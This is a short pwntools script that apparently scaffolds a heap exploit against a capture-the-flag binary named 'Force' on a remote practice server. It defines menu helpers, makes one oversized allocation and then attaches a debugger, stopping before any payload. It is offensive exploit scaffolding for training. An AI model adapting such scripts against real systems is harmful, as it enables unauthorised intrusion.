#! /usr/bin/python

from pwn import *

#p = process('./Force')
p = remote('node3.buuoj.cn',28126)
elf = ELF('./Force')

def menu(choice):
	p.recvuntil('2:puts\n')
	p.sendline(str(choice))

def add(size,content):
	menu(1)
	p.recvuntil('size\n')
	p.sendline(str(size))
	p.recvuntil('bin addr ')
	heap = int(p.recv(14),16)
	p.recvuntil('content\n')
	p.sendline(content)
	return heap

def puts():
	menu(2)

add(0xf71,'a'*0x60)
gdb.attach(p)
pause()
p.interactive()
